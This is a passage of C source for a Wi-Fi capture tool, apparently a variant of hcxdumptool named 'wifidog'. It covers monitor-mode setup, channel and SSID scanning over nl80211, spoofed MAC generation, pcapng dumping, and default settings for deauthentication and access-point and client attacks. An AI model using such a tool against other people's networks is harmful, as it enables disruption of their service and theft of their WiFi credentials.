	timestamp = ((uint64_t) tv.tv_sec * 1000000) + tv.tv_usec;
	timestampstart = timestamp;
	tvfd.tv_sec = 1;
	tvfd.tv_usec = 0;
	statuscount = 1;
	if (set_channel(ch) == false) {
		fprintf(stderr, "\nfailed to set channel\n");
		globalclose();
	}
	send_undirected_proberequest();
	while (1) {
		if (gpiobutton > 0) {
			if (GET_GPIO(gpiobutton) > 0) {
				globalclose();
			}
		}
		if (wantstopflag == true) {
			globalclose();
		}
		if (errorcount >= maxerrorcount) {
			fprintf(stderr,
				"\nmaximum number of errors is reached\n");
			globalclose();
		}
		FD_ZERO(&readfds);
		FD_SET(fd_socket, &readfds);
		fdnum = select(fd_socket + 1, &readfds, NULL, NULL, &tvfd);
		if (fdnum < 0) {
			errorcount++;
			continue;
		} else if (fdnum > 0 && FD_ISSET(fd_socket, &readfds)) {
			packet_len =
			    read(fd_socket, epb + EPB_SIZE, PCAPNG_MAXSNAPLEN);
			if (packet_len == 0) {
				fprintf(stderr, "\ninterface went down\n");
				globalclose();
			}
			if (packet_len < 0) {
				perror("\nfailed to read packet");
				errorcount++;
				continue;
			}
			if (packet_len < (int) RTH_SIZE) {
				fprintf(stderr,
					"\ngot damged radiotap header\n");
				errorcount++;
				continue;
			}
			if (ioctl(fd_socket, SIOCGSTAMP, &tv) < 0) {
				perror("\nfailed to get time");
				errorcount++;
				continue;
			}
			timestamp =
			    ((uint64_t) tv.tv_sec * 1000000) + tv.tv_usec;
		} else {
			if ((statuscount % 5) == 0) {
				if (gpiostatusled > 0) {
					GPIO_SET = 1 << gpiostatusled;
					usleep(GPIO_DELAY);
					GPIO_CLR = 1 << gpiostatusled;
				}
			}
			if ((statuscount % 2) == 0) {
				printapinfo(ch);
				cpa++;
				if (channelscanlist[cpa] == 0) {
					cpa = 0;
				}
				if (set_channel(ch) == true) {
					send_undirected_proberequest();
				} else {
					printf("\nfailed to set channel\n");
					globalclose();
				}
			}
			tvfd.tv_sec = 1;
			tvfd.tv_usec = 0;
			statuscount++;
			continue;
		}
		if (packet_len < (int) RTH_SIZE + (int) MAC_SIZE_NORM) {
			continue;
		}
		packet_ptr = &epb[EPB_SIZE];
		rth = (rth_t *) packet_ptr;
		ieee82011_ptr = packet_ptr + le16toh(rth->it_len);
		ieee82011_len = packet_len - le16toh(rth->it_len);
		if (rth->it_present == 0) {
			continue;
		}
		if ((rth->it_present & 0x20) == 0) {
			continue;
		}
		incommingcount++;
		macfrx = (mac_t *) ieee82011_ptr;
		if ((macfrx->from_ds == 1) && (macfrx->to_ds == 1)) {
			payload_ptr = ieee82011_ptr + MAC_SIZE_LONG;
			payload_len = ieee82011_len - MAC_SIZE_LONG;
		} else {
			payload_ptr = ieee82011_ptr + MAC_SIZE_NORM;
			payload_len = ieee82011_len - MAC_SIZE_NORM;
		}
		if (macfrx->type == IEEE80211_FTYPE_MGMT) {
			if (macfrx->subtype == IEEE80211_STYPE_BEACON) {
				process80211rcascanbeacon();
			} else if (macfrx->subtype ==
				   IEEE80211_STYPE_PROBE_RESP) {
				process80211rcascanproberesponse();
			}
		}
		if (fd_rcascanpcapng != 0) {
			writeepb(fd_rcascanpcapng);
		}
	}
	return;
}

/*===========================================================================*/
static bool ischannelindefaultlist(uint8_t userchannel)
{
	static uint8_t cpd;
	cpd = 0;
	while (channeldefaultlist[cpd] != 0) {
		if (userchannel == channeldefaultlist[cpd]) {
			return true;
		}
		cpd++;
	}
	return false;
}

/*===========================================================================*/
static inline bool processuserscanlist(char *optarglist)
{
	static char *ptr;
	static char *userscanlist;

	userscanlist = strdupa(optarglist);
	cpa = 0;
	ptr = strtok(userscanlist, ",");
	while (ptr != NULL) {
		channelscanlist[cpa] = atoi(ptr);
		if (ischannelindefaultlist(channelscanlist[cpa]) == false) {
			return false;
		}
		ptr = strtok(NULL, ",");
		cpa++;
		if (cpa > 127) {
			return false;
		}
	}
	channelscanlist[cpa] = 0;
	cpa = 0;

	return true;
}

/*===========================================================================*/
static inline size_t chop(char *buffer, size_t len)
{
	static char *ptr;

	ptr = buffer + len - 1;
	while (len) {
		if (*ptr != '\n')
			break;
		*ptr-- = 0;
		len--;
	}
	while (len) {
		if (*ptr != '\r')
			break;
		*ptr-- = 0;
		len--;
	}
	return len;
}

/*---------------------------------------------------------------------------*/
static inline int fgetline(FILE * inputstream, size_t size, char *buffer)
{
	static size_t len;
	static char *buffptr;

	if (feof(inputstream))
		return -1;
	buffptr = fgets(buffer, size, inputstream);
	if (buffptr == NULL)
		return -1;
	len = strlen(buffptr);
	len = chop(buffptr, len);
	return len;
}

/*===========================================================================*/
static inline int readfilterlist(char *listname, maclist_t * zeiger)
{
	static int len;
	static int c;
	static int entries;
	static FILE *fh_filter;

	static char linein[FILTERLIST_LINE_LEN];

	if ((fh_filter = fopen(listname, "r")) == NULL) {
		fprintf(stderr, "opening blacklist failed %s\n", listname);
		return 0;
	}

	zeiger = filterlist;
	entries = 0;
	c = 1;
	while (entries < FILTERLIST_MAX) {
		if ((len =
		     fgetline(fh_filter, FILTERLIST_LINE_LEN, linein)) == -1) {
			break;
		}
		if (len < 12) {
			c++;
			continue;
		}
		if (linein[0x0] == '#') {
			c++;
			continue;
		}
		if (hex2bin(&linein[0x0], zeiger->addr, 6) == true) {
			zeiger++;
			entries++;
		} else {
			fprintf(stderr,
				"reading blacklist line %d failed: %s\n", c,
				linein);
		}
		c++;
	}
	fclose(fh_filter);
	return entries;
}

/*===========================================================================*/
static bool initgpio(int gpioperi)
{
	static int fd_mem;

	fd_mem = open("/dev/mem", O_RDWR | O_SYNC);
	if (fd_mem < 0) {
		fprintf(stderr, "failed to get device memory\n");
		return false;
	}

	gpio_map =
	    mmap(NULL, BLOCK_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd_mem,
		 GPIO_BASE + gpioperi);
	close(fd_mem);

	if (gpio_map == MAP_FAILED) {
		fprintf(stderr, "failed to map GPIO memory\n");
		return false;
	}

	gpio = (volatile unsigned *) gpio_map;

	return true;
}

/*===========================================================================*/
static int getrpirev()
{
	static FILE *fh_rpi;
	static int len;
	static int rpi = 0;
	static int rev = 0;
	static int gpioperibase = 0;
	static char *revptr = NULL;
	static char *revstr = "Revision";
	static char *hwstr = "Hardware";
	static char *snstr = "Serial";
	static char linein[128];

	fh_rpi = fopen("/proc/cpuinfo", "r");
	if (fh_rpi == NULL) {
		perror("failed to retrieve cpuinfo");
		return gpioperibase;
	}

	while (1) {
		if ((len = fgetline(fh_rpi, 128, linein)) == -1) {
			break;
		}
		if (len < 15) {
			continue;
		}
		if (memcmp(&linein, hwstr, 8) == 0) {
			rpi |= 1;
			continue;
		}
		if (memcmp(&linein, revstr, 8) == 0) {
			rpirevision = strtol(&linein[len - 6], &revptr, 16);
			if ((revptr - linein) == len) {
				rev = (rpirevision >> 4) & 0xff;
				if (rev <= 3) {
					gpioperibase = GPIO_PERI_BASE_OLD;
					rpi |= 2;
					continue;
				}
				if (rev == 0x9) {
					gpioperibase = GPIO_PERI_BASE_OLD;
					rpi |= 2;
					continue;
				}
				if (rev == 0xc) {
					gpioperibase = GPIO_PERI_BASE_OLD;
					rpi |= 2;
					continue;
				}
				if ((rev == 0x04) || (rev == 0x08)
				    || (rev == 0x0d) || (rev == 0x00e)) {
					gpioperibase = GPIO_PERI_BASE_NEW;
					rpi |= 2;
					continue;
				}
				continue;
			}
			rpirevision = strtol(&linein[len - 4], &revptr, 16);
			if ((revptr - linein) == len) {
				if ((rpirevision < 0x02)
				    || (rpirevision > 0x15)) {
					continue;
				}
				if ((rpirevision == 0x11)
				    || (rpirevision == 0x14)) {
					continue;
				}
				gpioperibase = GPIO_PERI_BASE_OLD;
				rpi |= 2;
			}
			continue;
		}
		if (memcmp(&linein, snstr, 6) == 0) {
			rpi |= 4;
			continue;
		}
	}
	fclose(fh_rpi);

	if (rpi < 0x7) {
		return 0;
	}
	return gpioperibase;
}

/*===========================================================================*/
static inline bool globalinit()
{
	static int c;
	static int myseek;
	static int gpiobasemem = 0;

	rpirevision = 0;
	fd_pcapng = 0;
	fd_ippcapng = 0;
	fd_weppcapng = 0;
	fd_rcascanpcapng = 0;

	errorcount = 0;
	incommingcount = 0;
	droppedcount = 0;
	outgoingcount = 0;

	day = 0;
	month = 0;
	year = 0;
	hour = 0;
	minute = 0;
	second = 0;

	lat = 0;
	lon = 0;
	alt = 0;

	mydisassociationsequence = 0;
	mydeauthenticationsequence = 0;
	mybeaconsequence = 0;
	myproberequestsequence = 0;
	myauthenticationrequestsequence = 0;
	myauthenticationresponsesequence = 0;
	myassociationrequestsequence = 0;
	myassociationresponsesequence = 0;
	myproberesponsesequence = 0;
	myidrequestsequence = 0;

	mytime = 0;
	setbuf(stdout, NULL);
	gettimeofday(&tv, NULL);

	myseek =
	    (mac_orig[3] << 16) + (mac_orig[4] << 8) + mac_orig[5] + tv.tv_sec +
	    tv.tv_usec;
	srand(myseek);
	myseek = mac_orig[2];

	if (myouiap == 0) {
		myouiap =
		    myvendorap[rand() % ((MYVENDORAP_SIZE / sizeof(int)))];
	}

	if (mynicap == 0) {
		mynicap =
		    (mac_orig[3] << 16) + (mac_orig[4] << 8) + mac_orig[5];
		for (myseek = 0; myseek < mac_orig[2]; myseek++) {
			mynicap += rand() & 0xffffff;
		}
	}

	myouiap &= 0xfcffff;
	mynicap &= 0xffffff;
	mac_mybcap[5] = mynicap & 0xff;
	mac_mybcap[4] = (mynicap >> 8) & 0xff;
	mac_mybcap[3] = (mynicap >> 16) & 0xff;
	mac_mybcap[2] = myouiap & 0xff;
	mac_mybcap[1] = (myouiap >> 8) & 0xff;
	mac_mybcap[0] = (myouiap >> 16) & 0xff;
	memcpy(&mac_myap, &mac_mybcap, 6);

	if (myouista == 0) {
		myouista =
		    myvendorsta[rand() % ((MYVENDORSTA_SIZE / sizeof(int)))];
	}
	if (mynicsta == 0) {
		mynicsta = rand() & 0xffffff;
	}

	myouista &= 0xffffff;
	mynicsta &= 0xffffff;
	mac_mysta[5] = mynicsta & 0xff;
	mac_mysta[4] = (mynicsta >> 8) & 0xff;
	mac_mysta[3] = (mynicsta >> 16) & 0xff;
	mac_mysta[2] = myouista & 0xff;
	mac_mysta[1] = (myouista >> 8) & 0xff;
	mac_mysta[0] = (myouista >> 16) & 0xff;

	memset(&laststam1, 0, 6);
	memset(&lastapm1, 0, 6);
	lastrcm1 = 0;
	lasttimestampm1 = 0;
	memset(&laststam2, 0, 6);
	memset(&lastapm2, 0, 6);
	lastrcm2 = 0;
	lasttimestampm2 = 0;

	rcrandom = (rand() % 0xfff) + 0xf000;
	for (c = 0; c < 32; c++) {
		anoncerandom[c] = rand() % 0xff;
	}

	if ((aplist = calloc((APLIST_MAX), APLIST_SIZE)) == NULL) {
		return false;
	}
	aplist_ptr = aplist;
	aplistcount = 0;

	if ((myaplist = calloc((MYAPLIST_MAX), MYAPLIST_SIZE)) == NULL) {
		return false;
	}
	myaplist_ptr = myaplist;

	if ((pownedlist = calloc((POWNEDLIST_MAX), MACMACLIST_SIZE)) == NULL) {
		return false;
	}

/*
	filterlist_len = 0;
	filterlist = NULL;
	if (filterlistname != NULL) {
		if ((filterlist =
		     calloc((FILTERLIST_MAX), MACLIST_SIZE)) == NULL) {
			return false;
		}
		filterlist_len = readfilterlist(filterlistname, filterlist);
		if (filterlist_len == 0) {
			return false;
		}
	}
*/

	if (rcascanflag == true) {
		pcapngoutname = NULL;
		ippcapngoutname = NULL;
		weppcapngoutname = NULL;
		if (rcascanpcapngname != NULL) {
			fd_rcascanpcapng =
			    hcxcreatepcapngdump(rcascanpcapngname, mac_orig,
						interfacename, mac_mybcap,
						rcrandom, anoncerandom,
						mac_mysta);
			if (fd_rcascanpcapng <= 0) {
				fprintf(stderr,
					"could not create dumpfile %s\n",
					rcascanpcapngname);
				return false;
			}
		}
	}
	if (pcapngoutname != NULL) {
		fd_pcapng =
		    hcxcreatepcapngdump(pcapngoutname, mac_orig, interfacename,
					mac_mybcap, rcrandom, anoncerandom,
					mac_mysta);
		if (fd_pcapng <= 0) {
			fprintf(stderr, "could not create dumpfile %s\n",
				pcapngoutname);
			return false;
		}
	}
	if (weppcapngoutname != NULL) {
		fd_weppcapng =
		    hcxcreatepcapngdump(weppcapngoutname, mac_orig,
					interfacename, mac_mybcap, rcrandom,
					anoncerandom, mac_mysta);
		if (fd_weppcapng <= 0) {
			fprintf(stderr, "could not create dumpfile %s\n",
				weppcapngoutname);
			return false;
		}
	}
	if (ippcapngoutname != NULL) {
		fd_ippcapng =
		    hcxcreatepcapngdump(ippcapngoutname, mac_orig,
					interfacename, mac_mybcap, rcrandom,
					anoncerandom, mac_mysta);
		if (fd_ippcapng <= 0) {
			fprintf(stderr, "could not create dumpfile %s\n",
				ippcapngoutname);
			return false;
		}
	}
	wantstopflag = false;
	signal(SIGINT, programmende);

	if ((gpiobutton > 0) || (gpiostatusled > 0)) {
		if (gpiobutton == gpiostatusled) {
			fprintf(stderr,
				"same value for wpi_button and wpi_statusled is not allowed\n");
			return false;
		}
		gpiobasemem = getrpirev();
		if (gpiobasemem == 0) {
			fprintf(stderr, "failed to locate GPIO\n");
			return false;
		}
		if (initgpio(gpiobasemem) == false) {
			fprintf(stderr, "failed to init GPIO\n");
			return false;
		}
		if (gpiostatusled > 0) {
			INP_GPIO(gpiostatusled);
			OUT_GPIO(gpiostatusled);
		}
		if (gpiobutton > 0) {
			INP_GPIO(gpiobutton);
		}
	}

	if (gpiostatusled > 0) {
		for (c = 0; c < 5; c++) {
			GPIO_SET = 1 << gpiostatusled;
			usleep(GPIO_DELAY);
			GPIO_CLR = 1 << gpiostatusled;
			usleep(GPIO_DELAY + GPIO_DELAY);
		}
	}
	return true;
}

/*===========================================================================*/
static inline bool opensocket()
{
	static struct ifreq ifr;
	static struct iwreq iwr;
	static struct sockaddr_ll ll;
	static struct ethtool_perm_addr *epmaddr;

	fd_socket = 0;
	fd_socket_gpsd = 0;

	checkallunwanted();
	if (checkmonitorinterface(interfacename) == true) {
		fprintf(stderr, "warning: %s is probably a monitor interface\n",
			interfacename);
	}

	if ((fd_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		perror("socket failed (do you have root privileges?)");
		return false;
	}

	memset(&ifr_old, 0, sizeof(ifr));
	strncpy(ifr_old.ifr_name, interfacename, IFNAMSIZ - 1);
	if (ioctl(fd_socket, SIOCGIFFLAGS, &ifr_old) < 0) {
		perror("failed to get current interface flags");
		return false;
	}

	memset(&iwr_old, 0, sizeof(iwr));
	strncpy(iwr_old.ifr_name, interfacename, IFNAMSIZ - 1);
	if (ioctl(fd_socket, SIOCGIWMODE, &iwr_old) < 0) {
		perror("failed to save current interface mode");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
	if (ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) {
		perror("failed to set interface down");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, interfacename, IFNAMSIZ - 1);
	iwr.u.mode = IW_MODE_MONITOR;
	if (ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0) {
		perror("failed to set monitor mode");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, interfacename, IFNAMSIZ - 1);
	if (ioctl(fd_socket, SIOCGIWMODE, &iwr) < 0) {
		perror("failed to get interface information");
		if (ignorewarningflag == false) {
			return false;
		}
	}
	if ((iwr.u.mode & IW_MODE_MONITOR) != IW_MODE_MONITOR) {
		fprintf(stderr, "interface is not in monitor mode\n");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
	ifr.ifr_flags = IFF_UP;
	if (ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) {
		perror("failed to set interface up");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
	if (ioctl(fd_socket, SIOCGIFFLAGS, &ifr) < 0) {
		perror("failed to get interface flags");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	if ((ifr.ifr_flags & (IFF_UP | IFF_RUNNING | IFF_BROADCAST)) !=
	    (IFF_UP | IFF_RUNNING | IFF_BROADCAST)) {
		fprintf(stderr, "interface may not be operational\n");
		if (ignorewarningflag == false) {
			return false;
		}
	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
	ifr.ifr_flags = 0;
	if (ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0) {
		perror("failed to get SIOCGIFINDEX");
		return false;
	}
	memset(&ll, 0, sizeof(ll));
	ll.sll_family = AF_PACKET;
	ll.sll_ifindex = ifr.ifr_ifindex;
	ll.sll_protocol = htons(ETH_P_ALL);
	ll.sll_halen = ETH_ALEN;
	if (bind(fd_socket, (struct sockaddr *) &ll, sizeof(ll)) < 0) {
		perror("failed to bind socket");
		return false;
	}

	epmaddr = malloc(sizeof(struct ethtool_perm_addr) + 6);
	if (!epmaddr) {
		perror
		    ("failed to malloc memory for permanent hardware address");
		return false;
	}
	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, interfacename, IFNAMSIZ - 1);
	epmaddr->cmd = ETHTOOL_GPERMADDR;
	epmaddr->size = 6;
	ifr.ifr_data = (char *) epmaddr;
	if (ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0) {
		perror("failed to get permanent hardware address");
		free(epmaddr);
		return false;
	}
	if (epmaddr->size != 6) {
		fprintf(stderr,
			"failed to get permanent hardware address length\n");
		free(epmaddr);
		return false;
	}
	memcpy(&mac_orig, epmaddr->data, 6);
	free(epmaddr);

	if ((fd_socket_gpsd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		perror("gpsd socket failed");
		gpsdflag = false;
	}
	return true;
}

/*===========================================================================*/
static bool testinterface()
{
	static struct ifaddrs *ifaddr = NULL;
	static struct ifaddrs *ifa = NULL;

	if (getifaddrs(&ifaddr) == -1) {
		perror("failed to get ifaddrs");
		return false;
	} else {
		for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
			if (ifa->ifa_addr) {
				if (strncmp
				    (ifa->ifa_name, interfacename,
				     IFNAMSIZ) == 0) {
					if (ifa->ifa_addr->sa_family ==
					    AF_PACKET) {
						return true;
					}
				}
			}
		}
	}
	return false;
}

/*===========================================================================*/
static bool get_perm_addr(char *ifname, uint8_t * permaddr, char *drivername)
{
	static int fd_info;
	static struct iwreq iwr;
	static struct ifreq ifr;
	static struct ethtool_perm_addr *epmaddr;
	static struct ethtool_drvinfo drvinfo;

	if ((fd_info = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket info failed");
		return false;
	}

	memset(&iwr, 0, sizeof(iwr));
	strncpy(iwr.ifr_name, ifname, IFNAMSIZ - 1);
	if (ioctl(fd_info, SIOCGIWNAME, &iwr) < 0) {
#ifdef DEBUG
		printf("testing %s %s\n", ifname, drivername);
		perror("not a wireless interface");
#endif
		close(fd_info);
		return false;
	}

	epmaddr = malloc(sizeof(struct ethtool_perm_addr) + 6);
	if (!epmaddr) {
		perror
		    ("failed to malloc memory for permanent hardware address");
		close(fd_info);
		return false;
	}

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	epmaddr->cmd = ETHTOOL_GPERMADDR;
	epmaddr->size = 6;
	ifr.ifr_data = (char *) epmaddr;
	if (ioctl(fd_info, SIOCETHTOOL, &ifr) < 0) {
		perror("failed to get permanent hardware address");
		free(epmaddr);
		close(fd_info);
		return false;
	}
	if (epmaddr->size != 6) {
		free(epmaddr);
		close(fd_info);
		return false;
	}
	memcpy(permaddr, epmaddr->data, 6);

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
	drvinfo.cmd = ETHTOOL_GDRVINFO;
	ifr.ifr_data = (char *) &drvinfo;
	if (ioctl(fd_info, SIOCETHTOOL, &ifr) < 0) {
		perror("failed to get driver information");
		free(epmaddr);
		close(fd_info);
		return false;
	}
	memcpy(drivername, drvinfo.driver, 32);
	free(epmaddr);
	close(fd_info);
	return true;
}

/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
	printf("%s %s (C) %s \n", eigenname, VERSION, VERSION_JAHR);
	exit(EXIT_SUCCESS);
}

/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
	printf("%s %s  (C) %s \n"
	       "usage  : %s <options>\n"
	       "example: %s -i wlan0 --ssid=openwrt\n"
	       "\n"
	       "options:\n"
	       "-i <interface> : interface (monitor mode will be enabled by wifidog)\n"
	       "                 can also be done manually:\n"
	       "                 ip link set <interface> down\n"
	       "                 iw dev <interface> set type monitor\n"
	       "                 ip link set <interface> up\n"
	       "-h             : show this help\n"
	       "-v             : show version\n"
	       "\n"
	       "--ssid=<SSID>  : The name of AP\n"
	       "--help         : show this help\n"
	       "--version      : show version\n"
	       "\n"
	       "If wifidog captured your password from WiFi traffic, you should check all your devices immediately!\n"
	       "\n",
	       eigenname, VERSION, VERSION_JAHR, eigenname, eigenname);

	exit(EXIT_SUCCESS);
}

/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
	printf("%s %s (C) %s \n"
	       "usage: %s -h for help\n", eigenname, VERSION, VERSION_JAHR,
	       eigenname);
	exit(EXIT_FAILURE);
}

/*===========================================================================*/
struct trigger_results
{
	int done;
	int aborted;
};

static int error_handler(struct sockaddr_nl *nla, struct nlmsgerr *err, void *arg)
{
	int *ret = arg;

	printf("error_handler() called.\n");
	*ret = err->error;
	return NL_STOP;
}

static int finish_handler(struct nl_msg *msg, void *arg)
{
	int *ret = arg;
	*ret = 0;
	return NL_SKIP;
}

static int ack_handler(struct nl_msg *msg, void *arg)
{
	int *ret = arg;
	
	*ret = 0;
	return NL_STOP;
}

static int no_seq_check(struct nl_msg *msg, void *arg)
{
	return NL_OK;
}

static int callback_trigger(struct nl_msg *msg, void *arg)
{
	struct genlmsghdr *gnlh = nlmsg_data(nlmsg_hdr(msg));
	struct trigger_results *results = arg;

	if (gnlh->cmd == NL80211_CMD_SCAN_ABORTED) {
		printf("Got NL80211_CMD_SCAN_ABORTED.\n");
		results->done = 1;
		results->aborted = 1;
	} else if (gnlh->cmd == NL80211_CMD_NEW_SCAN_RESULTS) {
		printf("Got NL80211_CMD_NEW_SCAN_RESULTS.\n");
		results->done = 1;
		results->aborted = 0;
	}

	return NL_SKIP;
}

int do_scan_trigger(struct nl_sock *socket, int if_index, int driver_id, char *ssidname)
{
	struct trigger_results results = { .done = 0, .aborted = 0 };
	struct nl_msg *msg = NULL;
	struct nl_cb *cb = NULL;
	struct nl_msg *ssids_to_scan = NULL;
	int err;
	int ret;
	int mcid = genl_ctrl_resolve_grp(socket, "nl80211", "scan");
	nl_socket_add_membership(socket, mcid);

	msg = nlmsg_alloc();
	if (!msg) {
		printf("ERROR: Failed to allocate netlink messagef or msg.\n");
		err = -ENOMEM;
		goto exit;
	}

	ssids_to_scan = nlmsg_alloc();
	if (!ssids_to_scan) {
		printf("ERROR: Failed to allocate netlink message for ssids_to_scan.\n");
		err = -ENOMEM;
		goto exit;
	}

	cb = nl_cb_alloc(NL_CB_DEFAULT);
	if (!cb) {
		printf("ERROR: Failed to allocate netlink callbacks.\n");
		err = -ENOMEM;
		goto exit;
	}

	printf("%s: ssid:%s\n", __func__, ssidname);

	genlmsg_put(msg, 0, 0, driver_id, 0, 0, NL80211_CMD_TRIGGER_SCAN, 0);
	nla_put_u32(msg, NL80211_ATTR_IFINDEX, if_index);
	nla_put(ssids_to_scan, 1, strlen(ssidname), ssidname);
	nla_put_nested(msg, NL80211_ATTR_SCAN_SSIDS, ssids_to_scan);
	nl_cb_set(cb, NL_CB_VALID, NL_CB_CUSTOM, callback_trigger, &results);
	nl_cb_err(cb, NL_CB_CUSTOM, error_handler, &err);
	nl_cb_set(cb, NL_CB_FINISH, NL_CB_CUSTOM, finish_handler, &err);
	nl_cb_set(cb, NL_CB_ACK, NL_CB_CUSTOM, ack_handler, &err);
	nl_cb_set(cb, NL_CB_SEQ_CHECK, NL_CB_CUSTOM, no_seq_check, NULL);

	err = 1;
	ret = nl_send_auto(socket, msg);
	while (err > 0)
		ret = nl_recvmsgs(socket, cb);
	if (err < 0) {
		printf("WARNING: err has a value of %d.\n", ret);
		goto exit;
	}
	if (ret < 0) {
		printf("ERROR: nl_recvmsgs() return %d (%s). \n", ret, nl_geterror(-ret));
		return ret;
	}

	while (!results.done) nl_recvmsgs(socket, cb);
	if (results.aborted) {
		printf("ERROR: kernel aborted scan. \n");
		return 1;
	}

	err = 0;
	
	if (cb) nl_cb_put(cb);
	nl_socket_drop_membership(socket, mcid);
exit:
	if (msg) nlmsg_free(msg);
	if (ssids_to_scan) nlmsg_free(ssids_to_scan);
	return err;	
}

static void set_filter_bssid(unsigned char *arg)
{
	int i, l;
	char mac_addr[20];

	l = 0;
	for (i = 0; i < 6; i++) {
		sprintf(mac_addr + i*2, "%02X", arg[i]);
	}

	filterlist_len = 1;
	filterlist = calloc((FILTERLIST_MAX), MACLIST_SIZE);
	hex2bin(mac_addr, filterlist->addr, 6);
	filtermode = 2;
}

static void get_ssid(unsigned char *ie, int ielen, char *ssid)
{
	uint8_t len;
	uint8_t *data;
	int i;

	ssid[0] = '\0';
	while (ielen >= 2 && ielen >= ie[1]) {
		if (ie[0] == 0 && ie[1] >= 0 && ie[1] <= 32) {
			len = ie[1];
			data = ie + 2;
			if (len <= 32) {
				memcpy(ssid, data, len);
				ssid[len] = '\0';
			}
			break;
		}
		ielen -= ie[1] + 2;
		ie += ie[1] + 2;
	}
}

static int freq_to_channel(uint32_t freq)
{
	if ((freq >= 2407) && (freq <= 2474))
		return (freq - 2407)/5;
	else if ((freq >= 2481) && (freq <= 2487))
		return (freq - 2412)/5;
	else if ((freq >= 5150) && (freq <= 5875))
		return (freq - 5000)/5;
	else
		return 0;
}

static int callback_dump(struct nl_msg *msg, void *arg)
{
	struct genlmsghdr *gnlh = nlmsg_data(nlmsg_hdr(msg));
	char ssid[32+1];
	struct nlattr *tb[NL80211_ATTR_MAX + 1];
	struct nlattr *bss[NL80211_BSS_MAX + 1];
	static struct nla_policy bss_policy[NL80211_BSS_MAX + 1] = {
		[NL80211_BSS_FREQUENCY] = { .type = NLA_U32 },
		[NL80211_BSS_BSSID] = { },
		[NL80211_BSS_INFORMATION_ELEMENTS] = { },
	};
/*
	static struct nla_policy bss_policy[NL80211_BSS_MAX + 1] = {
		[NL80211_BSS_TSF] = { .type = NLA_U64 },
		[NL80211_BSS_FREQUENCY] = { .type = NLA_U32 },
		[NL80211_BSS_BSSID] = { },
		[NL80211_BSS_BEACON_INTERVAL] = { .type = NLA_U16 },
		[NL80211_BSS_CAPABILITY] = { .type = NLA_U16 },
		[NL80211_BSS_INFORMATION_ELEMENTS] = { },
		[NL80211_BSS_SIGNAL_MBM] = { .type = NLA_U32 },
		[NL80211_BSS_SIGNAL_UNSPEC] = { .type = NLA_U8 },
		[NL80211_BSS_STATUS] = { .type = NLA_U32 },
		[NL80211_BSS_SEEN_MS_AGO] = { .type = NLA_U32 },
		[NL80211_BSS_BEACON_IES] = { },
	};
*/

	nla_parse(tb, NL80211_ATTR_MAX, genlmsg_attrdata(gnlh, 0), genlmsg_attrlen(gnlh, 0), NULL);
	if (!tb[NL80211_ATTR_BSS]) {
		printf("bss info missing!\n");
		return NL_SKIP;
	}
	if (nla_parse_nested(bss, NL80211_BSS_MAX, tb[NL80211_ATTR_BSS], bss_policy)) {
		printf("failed to parse nested attributes!\n");
		return NL_SKIP;
	}
	if (!bss[NL80211_BSS_BSSID]) return NL_SKIP;
	if (!bss[NL80211_BSS_INFORMATION_ELEMENTS]) return NL_SKIP;

	get_ssid(nla_data(bss[NL80211_BSS_INFORMATION_ELEMENTS]), nla_len(bss[NL80211_BSS_INFORMATION_ELEMENTS]), ssid);
	if ( strcmp(ssid, filterssid) == 0 ) {
		set_filter_bssid(nla_data(bss[NL80211_BSS_BSSID]));
		filterchannel = freq_to_channel(nla_get_u32(bss[NL80211_BSS_FREQUENCY]));
		printf("%s - ch%d\n", ssid, filterchannel);
	}

	return NL_SKIP;
}


/*===========================================================================*/
int main(int argc, char *argv[])
{
	static int auswahl;
	static int index;
	static struct ifreq ifr;
	/* NeoJou */
	int if_index;
	struct nl_sock *socket;
	int driver_id;
	int err = EXIT_SUCCESS;

	maxerrorcount = ERRORMAX;
	staytime = TIME_INTERVAL;
	eapoltimeout = EAPOLTIMEOUT;
	deauthenticationintervall = DEAUTHENTICATIONINTERVALL;
	deauthenticationsmax = DEAUTHENTICATIONS_MAX;
	apattacksintervall = APATTACKSINTERVALL;
	apattacksmax = APPATTACKS_MAX;
	filtermode = 0;
	statusout = 0;
	stachipset = 0;

	ignorewarningflag = false;
	poweroffflag = false;
	gpsdflag = false;
	staytimeflag = false;
	activescanflag = false;
	rcascanflag = false;
	deauthenticationflag = false;
	disassociationflag = false;
	attackapflag = false;
	attackclientflag = false;

	myouiap = 0;
	mynicap = 0;

	myouista = 0;
	mynicsta = 0;

	interfacename = NULL;
	pcapngoutname = NULL;
	ippcapngoutname = NULL;
	weppcapngoutname = NULL;
	filterlistname = NULL;
	rcascanpcapngname = NULL;

	static const char *short_options = "i:hv";
